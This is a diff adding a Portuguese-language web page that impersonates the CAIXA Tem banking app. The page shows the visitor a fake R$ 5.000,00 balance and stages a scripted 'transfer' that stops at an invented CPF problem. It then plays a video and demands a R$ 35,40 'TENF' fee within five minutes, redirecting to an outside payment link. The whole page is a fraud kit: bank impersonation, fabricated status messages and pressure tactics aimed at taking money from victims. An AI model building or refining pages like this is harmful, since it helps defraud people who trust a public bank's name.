@@ -1,0 +1,566 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <!-- Google tag (gtag.js) -->
+  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-KB0R572XG6"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-KB0R572XG6');
+  </script>
+  <script>
+  window.pixelId = "6908183506b66485dbf2e23f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Confirmação de Pagamento - CAIXA tem!</title>
+  <script>
+    localStorage.setItem("upsell", "up2");
+    </script>
+<script>
+  window.pixelId = "692b50ba43f7b96eaa77880c";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script src="js/latest_1.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="js/lucide.js"></script>
+  <style>
+    .status-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .status-icon {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 0.5rem;
+    }
+
+    .status-text {
+      text-align: center;
+      margin-bottom: 1rem;
+    }
+
+    .status-progress {
+      width: 100%;
+    }
+  </style>
+  <script>
+
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'caixa-blue2': '#015CA9',
+            'caixa-light-blue2': '#049FD6',
+            'caixa-blue': '#1A65C0',
+            'caixa-light-blue': '#2386D9',
+            'success-green': '#30BF63',
+          }
+        }
+      }
+    }
+
+    // Variáveis de controle de tempo (em segundos)
+    const LOADING_DURATION = 2; // Tempo total do loading em segundos
+    const VIDEO_DELAY = 1; // Tempo para mostrar o vídeo após a pendência
+    const COMPLETE_DELAY = 44; // Tempo para mostrar o conteúdo completo após o vídeo
+
+  </script>
+
+  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+</head>
+
+<body class="bg-[#EDF6FF] min-h-screen">
+  <!-- Header Azul -->
+  <div class="bg-gradient-to-r from-caixa-blue2 to-caixa-light-blue2 text-white pt-2 pb-8 px-4 mb-2">
+    <!-- Topo com logo e ícones -->
+    <div class="flex justify-between items-center mb-5 pb-2 relative">
+      <!-- Logo CAIXA tem! -->
+      <div class="flex items-center">
+        <img src="images/raspapix.png" alt="Logo CAIXA tem!" class="h-8 rounded">
+      </div>
+
+      <!-- Ícones da direita -->
+      <!-- <div class="flex items-center space-x-4">
+        <i data-lucide="search" class="w-6 h-6" stroke-width="3"></i>
+        <i data-lucide="more-vertical" class="w-6 h-6" stroke-width="3"></i>
+      </div> -->
+
+      <!-- Borda inferior sem padding -->
+      <div class="absolute bottom-0 left-[-1rem] right-[-1rem] h-0.5 bg-white bg-opacity-20"></div>
+    </div>
+
+    <!-- Informações do usuário -->
+    <div class="flex items-center mb-4">
+      <div class="size-8 bg-white bg-opacity-20 rounded-full flex items-center justify-center mr-2">
+        <i data-lucide="user" class="size-5 text-white" stroke-width="2"></i>
+      </div>
+      <div>
+        <h1 class="text-base font-medium">Olá, --!</h1>
+        <p class="text-sm opacity-90">315.562.345-43</p>
+      </div>
+    </div>
+
+    <!-- Valor da indenização -->
+    <div class="text-center">
+      <p class="text-base opacity-90">Saldo disponível</p>
+      <p class="text-xl font-bold">R$ 5.000,00</p>
+    </div>
+  </div>
+
+  <!-- Conteúdo principal -->
+  <div class="px-4 py-6">
+    <div class="bg-white rounded-md shadow-lg p-4 pb-6 -mt-4 relative">
+      <!-- Estado inicial: Confirmação -->
+      <div id="confirmationState">
+        <!-- Ícone de confirmação -->
+        <div class="flex justify-center mb-2">
+          <div class="size-8 bg-caixa-light-blue rounded-full flex items-center justify-center">
+            <i data-lucide="check" class="size-4 text-white" stroke-width="6"></i>
+          </div>
+        </div>
+
+        <!-- Mensagem de confirmação -->
+        <div class="text-center mb-6 space-y-2">
+          <h2 class="text-base font-bold text-caixa-light-blue">Pagamento Confirmado!</h2>
+          <p class="text-gray-700 leading-relaxed text-xs">
+            Sua atenticidade foi confirmada com sucesso! Clique no botão abaixo para confirmar a transferência
+            na sua chave pix cadastrada.
+          </p>
+        </div>
+
+        <!-- Botão de confirmação -->
+        <button onclick="handleConfirmation()" class="w-full bg-success-green hover:bg-green-600 text-white font-medium py-2 px-6 rounded-md transition-colors duration-200 text-base">
+          CONFIRMAR SAQUE
+        </button>
+      </div>
+
+      <div id="statusState" class="hidden">
+        <div class="status-container">
+          <div id="statusIcon" class="status-icon">
+            <img id="statusImage" src="images/15.png" alt="Ícone" class="size-6">
+          </div>
+          <div id="statusText" class="status-text">
+            <h2 class="text-sm font-bold text-caixa-light-blue">Transferindo...</h2>
+          </div>
+          <div id="statusProgress" class="status-progress">
+            <div class="w-full bg-gray-200 rounded-full h-2 mb-4">
+              <div id="progressBar" class="bg-gradient-to-r from-caixa-blue to-caixa-light-blue h-2 rounded-full transition-all ease-out" style="width: 0%"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Estado do vídeo explicativo -->
+      <div id="videoState" class="hidden">
+        <!-- Título principal -->
+        <div class="text-center mb-4">
+          <h2 class="text-base font-bold text-caixa-light-blue mb-2">
+            Foi identificado uma pendência no seu CPF!
+          </h2>
+          <p class="text-gray-700 text-sm leading-relaxed">
+            Assista o vídeo explicativo para a liberação da sua transferência.
+          </p>
+        </div>
+
+        <!-- Placeholder do vídeo -->
+        <div class="w-full bg-gray-200 rounded-lg overflow-hidden mb-4" style="aspect-ratio: 16/9; position: relative;">
+          <div class="w-full h-full flex items-center justify-center bg-gray-300" style="position: relative;">
+            <video id="main-video-up1" src="media/vsl-up1.mp4" preload="metadata" playsinline="" style="width: 100%; height: 100%; object-fit: cover;"></video>
+            <!-- Overlay Pulsante para Ativar Som -->
+            <div id="video-sound-overlay-up1" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: transparent; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; cursor: pointer; transition: opacity 0.3s ease;">
+              <div style="text-align: center; animation: pulse 2s ease-in-out infinite;">
+                <div style="width: 80px; height: 80px; margin: 0 auto 20px; background: #FF0000; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(255, 0, 0, 0.6), 0 0 60px rgba(255, 0, 0, 0.4); animation: pulse-ring 2s ease-in-out infinite;">
+                  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3)); margin-left: 2px;">
+                    <path d="M8 5v14l11-7z" fill="white"></path>
+                  </svg>
+                </div>
+                <p style="color: white; font-size: 18px; font-weight: 600; margin: 0; text-shadow: 2px 2px 8px rgba(0,0,0,0.8); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">Clique para ouvir</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <style>
+          @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+          }
+          @keyframes pulse-ring {
+            0% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.6), 0 0 60px rgba(255, 0, 0, 0.4); }
+            50% { box-shadow: 0 0 50px rgba(255, 0, 0, 0.8), 0 0 100px rgba(255, 0, 0, 0.6); }
+            100% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.6), 0 0 60px rgba(255, 0, 0, 0.4); }
+          }
+          #video-sound-overlay-up1:hover div > div {
+            transform: scale(1.1);
+            transition: transform 0.2s ease;
+          }
+          #video-sound-overlay-up1:hover div {
+            animation-duration: 1s;
+          }
+        </style>
+        <script>
+          (function(){
+            var overlay = document.getElementById('video-sound-overlay-up1');
+            var video = document.getElementById('main-video-up1');
+            var videoState = document.getElementById('videoState');
+            
+            if (!video) return;
+            
+            // Função para iniciar o vídeo
+            function startVideo() {
+              if (!video || video.hasStarted) return;
+              video.hasStarted = true;
+              
+              // Garantir que não reinicia ao terminar
+              video.loop = false;
+              
+              // Tenta começar desmutado
+              video.muted = false;
+              
+              // Tenta dar play desmutado
+              var playPromise = video.play();
+              
+              if (playPromise !== undefined) {
+                playPromise.then(function() {
+                  // Autoplay funcionou! Tenta desmutar após 1 segundo
+                  setTimeout(function() {
+                    if (video.muted) {
+                      video.muted = false;
+                      video.volume = 1.0;
+                    }
+                    // Remove overlay após 2 segundos se ainda estiver visível
+                    setTimeout(function() { unmuteAndHide(false); }, 2000);
+                  }, 1000);
+                }).catch(function(error) {
+                  // Autoplay bloqueado, começa mutado
+                  console.log('Autoplay bloqueado, iniciando mutado:', error);
+                  video.muted = true;
+                  video.play().catch(function(e) {
+                    console.log('Erro ao reproduzir vídeo mutado:', e);
+                  });
+                  
+                  // Desmuta automaticamente após 3 segundos
+                  setTimeout(function() {
+                    video.muted = false;
+                    video.volume = 1.0;
+                    setTimeout(function() { unmuteAndHide(false); }, 1000);
+                  }, 3000);
+                });
+              }
+            }
+            
+            // Função para desmutar e remover overlay
+            function unmuteAndHide(resetVideo) {
+              if (video) {
+                video.muted = false;
+                video.volume = 1.0;
+                // Se resetVideo for true, volta o vídeo ao início
+                if (resetVideo) {
+                  video.currentTime = 0;
+                }
+              }
+              if (overlay && overlay.style.display !== 'none') {
+                overlay.style.opacity = '0';
+                setTimeout(function() {
+                  overlay.style.display = 'none';
+                }, 300);
+              }
+            }
+            
+            // Observar quando o videoState for exibido
+            if (videoState) {
+              var observer = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                  if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
+                    if (!videoState.classList.contains('hidden')) {
+                      // Vídeo apareceu na página, iniciar reprodução
+                      startVideo();
+                    }
+                  }
+                });
+              });
+              
+              observer.observe(videoState, {
+                attributes: true,
+                attributeFilter: ['class']
+              });
+            }
+            
+            // Clique no overlay para desmutar imediatamente e reiniciar vídeo
+            if (overlay) {
+              overlay.addEventListener('click', function() {
+                // Se o vídeo ainda não começou, iniciar
+                if (!video.hasStarted) {
+                  startVideo();
+                }
+                
+                // Se o vídeo está mutado, desmuta e reinicia
+                if (video.muted) {
+                  unmuteAndHide(true); // true = reinicia o vídeo
+                  // Garante que o vídeo está tocando
+                  video.play().catch(function(e) {
+                    console.log('Erro ao reproduzir vídeo:', e);
+                  });
+                } else {
+                  // Se já está desmutado, apenas remove o overlay
+                  unmuteAndHide(false);
+                }
+              });
+              
+              // Remove overlay se o som já estiver ativo (sem reiniciar)
+              video.addEventListener('volumechange', function() {
+                if (!video.muted && overlay.style.display !== 'none') {
+                  // Não reinicia se foi mudança automática de volume
+                  unmuteAndHide(false);
+                }
+              });
+              
+              // Remove overlay quando o vídeo começar a tocar com som (sem reiniciar)
+              video.addEventListener('playing', function() {
+                if (!video.muted && overlay.style.display !== 'none') {
+                  setTimeout(function() {
+                    unmuteAndHide(false);
+                  }, 500);
+                }
+              });
+              
+              // Quando o vídeo terminar, pausar e não reiniciar
+              video.addEventListener('ended', function() {
+                try {
+                  video.pause();
+                  // Mantém o último frame e evita replay automático
+                  video.currentTime = Math.max(0, video.duration);
+                } catch (e) {}
+              });
+            }
+          })();
+        </script>
+        <!-- Estado completo com informações da TENF -->
+
+        <div id="completeState" class="hidden">
+          <!-- Seção TENF -->
+          <div class="bg-yellow-50 border-l-4 border-[#FA9E1E] rounded-lg p-3 mb-4">
+            <h3 class="text-[#856404] font-bold text-sm mb-2">TENF (Taxa de Emissão de Nota Fiscal)</h3>
+            <p class="text-[#856404] text-sm leading-relaxed">
+              Para você receber o seu prêmio, é necessário efetuar o pagamento da Taxa de Emissão de Nota Fiscal.
+              Caso o pagamento não seja confirmado nos próximos 5 minutos, o seu saque será cancelado e
+              transferido
+              para fins públicos.
+            </p>
+          </div>
+
+          <!-- Detalhes da indenização -->
+          <div class="bg-[#E9FAFF] rounded-lg p-3 mb-4 text-zinc-600">
+            <div class="flex justify-between items-center py-1">
+              <span class="text-caixa-light-blue text-sm font-bold">Valor a receber:</span>
+              <span class="font-medium text-sm">R$ 5.000,00</span>
+            </div>
+            <div class="flex justify-between items-center py-1">
+              <span class="text-caixa-light-blue text-sm font-bold">Valor da Taxa:</span>
+              <span class="font-medium text-sm">R$ 35,40</span>
+            </div>
+            <div class="flex justify-between items-center py-1">
+              <span class="text-caixa-light-blue text-sm font-bold">Liberação da transferência:</span>
+              <span class="font-medium text-sm">Imediatamente</span>
+            </div>
+          </div>
+
+          <!-- Texto explicativo -->
+          <div class="text-center mb-4">
+            <p class="text-gray-700 text-sm leading-relaxed">
+              A <strong>Taxa TENF</strong> já foi vinculado a sua conta, efetue o pagamento da taxa
+              clicando no botão
+              abaixo e libere o seu saque no mesmo segundo.
+            </p>
+          </div>
+
+          <!-- Botão de pagamento -->
+          <button onclick="handlePayment()" class="w-full bg-success-green hover:bg-green-600 text-white font-medium py-3 px-6 rounded-md transition-colors duration-200 text-base">
+            Efetuar o pagamento do Imposto
+          </button>
+        </div>
+      </div>
+
+
+
+    </div>
+  </div>
+
+  <script>
+    // Inicializar ícones do Lucide
+    lucide.createIcons();
+
+    // Função para atualizar o status
+    function updateStatus(imageSrc, text, showProgress = false) {
+      const imageElement = document.querySelector('#statusImage');
+      const textElement = document.querySelector('#statusText h2');
+      const progressContainer = document.querySelector('#statusProgress');
+
+      if (imageElement && imageSrc) {
+        imageElement.src = imageSrc;
+      }
+
+      if (textElement) {
+        // Se for "Pendência encontrada!", adiciona ícone de aviso
+        if (text === 'Pendência encontrada!') {
+          textElement.innerHTML = `
+            <span style="display: inline-flex; align-items: center; gap: 6px;">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="flex-shrink: 0;">
+                <path d="M12 9v4M12 17h.01M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+              <span>${text}</span>
+            </span>
+          `;
+        } else {
+          textElement.textContent = text;
+        }
+      }
+
+      if (progressContainer) {
+        progressContainer.innerHTML = showProgress ?
+          `<div class="w-full bg-gray-200 rounded-full h-2 mb-4">
+                <div id="progressBar" class="bg-gradient-to-r from-caixa-blue to-caixa-light-blue h-2 rounded-full transition-all ease-out" style="width: 0%"></div>
+              </div>` :
+          `<div class="w-full bg-gradient-to-r from-caixa-blue to-caixa-light-blue rounded-full h-2 mb-4"></div>`;
+      }
+    }
+
+    function handleConfirmation() {
+      // Esconder estado de confirmação e mostrar status
+      document.getElementById('confirmationState').classList.add('hidden');
+      document.getElementById('statusState').classList.remove('hidden');
+
+      // Configurar estado de loading (apenas texto e progresso, imagem já está correta)
+      updateStatus('', 'Transferindo...', true);
+
+      // Animar a barra de progresso
+      const progressBar = document.getElementById('progressBar');
+      if (progressBar) {
+        progressBar.style.width = '0%';
+        progressBar.style.transitionDuration = `${LOADING_DURATION}s`;
+
+        // Animar para 100% (completamente preenchida)
+        setTimeout(() => {
+          progressBar.style.width = '100%';
+        }, 100);
+      }
+
+      // Após o tempo de loading + delay, mostrar estado de pendência
+      setTimeout(() => {
+        updateStatus('../assets/icons/16.png', 'Pendência encontrada!', false);
+      }, (LOADING_DURATION + 2) * 1000);
+
+      // Após mais tempo, mostrar estado do vídeo
+      setTimeout(() => {
+        document.getElementById('statusState').classList.add('hidden');
+        document.getElementById('videoState').classList.remove('hidden');
+
+        // Mudar o texto do header
+        const headerText = document.querySelector('.text-center p');
+        if (headerText) {
+          headerText.textContent = 'Aguardando liberação';
+        }
+      }, (LOADING_DURATION + 2 + VIDEO_DELAY) * 1000);
+
+      // Após mais tempo, mostrar estado completo
+      setTimeout(() => {
+        document.getElementById('completeState').classList.remove('hidden');
+      }, (LOADING_DURATION + 2 + VIDEO_DELAY + COMPLETE_DELAY) * 1000);
+    }
+
+    function handlePayment() {
+      // Redirecionar para a página de pagamento
+      const params = new URLSearchParams(window.location.search);
+      const baseUrl = "https://go.transacaomarketplace.com/ornna3x75u";
+      window.location.href = `${baseUrl}?${params.toString()}`;
+    }
+
+    function getURLParams() {
+      const params = new URLSearchParams(window.location.search);
+      return Object.fromEntries(params.entries());
+    }
+
+    function formatarCPF(cpf) {
+      // Remove tudo que não é dígito
+      const cpfLimpo = cpf.replace(/\D/g, '');
+
+      // Verifica se tem 11 dígitos
+      if (cpfLimpo.length !== 11) {
+        return cpf; // Retorna o valor original se não for um CPF válido
+      }
+
+      // Formata o CPF: XXX.XXX.XXX-XX
+      return cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    }
+
+    function substituirNome(nome) {
+      const greeting = document.querySelector("h1");
+      if (greeting) {
+        greeting.textContent = `Olá, ${nome}!`;
+      }
+    }
+
+    function substituirDocumento(documento) {
+      const docElement = document.querySelector("p.text-sm.opacity-90:last-of-type");
+      if (docElement) {
+        const cpfFormatado = formatarCPF(documento);
+        docElement.textContent = cpfFormatado;
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      // Buscar dados do localStorage
+      let firstName = null;
+      let cpf = null;
+      
+      try {
+        const cpfData = localStorage.getItem("cpf-data");
+        if (cpfData) {
+          const data = JSON.parse(cpfData);
+          firstName = data.firstName || null;
+          cpf = data.cpf || null;
+        }
+      } catch (e) {
+        console.error("Erro ao ler localStorage:", e);
+      }
+
+      // Substituir nome com primeiro nome do localStorage
+      if (firstName && firstName.trim() !== '') {
+        substituirNome(firstName);
+      } else {
+        // Fallback para parâmetros da URL se não houver no localStorage
+        const params = getURLParams();
+        if (params.name && params.name.trim() !== '') {
+          substituirNome(params.name);
+        } else {
+          substituirNome("--");
+        }
+      }
+
+      // Substituir documento com CPF do localStorage
+      if (cpf && cpf.trim() !== '') {
+        substituirDocumento(cpf);
+      } else {
+        // Fallback para parâmetros da URL se não houver no localStorage
+        const params = getURLParams();
+        if (params.document && params.document.trim() !== '') {
+          substituirDocumento(params.document);
+        } else {
+          substituirDocumento("--");
+        }
+      }
+    });
+  </script>
+
+
+
+</body></html>
